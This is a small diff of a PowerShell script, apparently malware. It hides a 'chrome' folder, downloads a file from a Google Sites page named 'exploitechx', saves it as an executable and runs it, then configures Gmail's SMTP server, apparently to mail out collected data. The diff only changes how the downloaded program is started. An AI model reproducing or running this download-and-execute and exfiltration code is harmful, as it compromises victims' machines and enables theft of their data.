@@ -3,7 +3,7 @@ $f=get-item .\chrome -Force
 $f.attributes="Hidden"
 cd chrome;
 wget https://sites.google.com/site/exploitechx/cpv.enc -OutFile cpv.exe
-start cpv.exe | Out-Null
+start cpv.exe
 Start-Sleep -s 10
 
 $SMTPServer = 'smtp.gmail.com'
